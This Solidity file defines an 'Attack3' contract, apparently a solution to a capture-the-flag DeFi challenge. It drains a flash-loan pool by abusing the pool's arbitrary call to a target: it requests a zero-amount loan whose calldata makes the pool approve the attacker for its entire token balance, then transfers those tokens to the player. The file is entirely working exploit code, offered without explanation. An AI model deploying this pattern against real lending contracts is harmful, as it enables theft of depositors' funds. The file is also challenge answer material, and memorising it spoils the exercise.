// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

interface IToken {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract Attack3 {
    address private immutable pool;
    address private immutable player;
    IToken private immutable token;

    constructor(address _pool, address _player, address _token) {
        pool = _pool;
        player = _player;
        token = IToken(_token);
    }

    function attack() external {
        uint256 balance = token.balanceOf(pool);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balance
        );

        IPool(pool).flashLoan(0, address(this), address(token), data);

        token.transferFrom(pool, player, balance);
    }
}
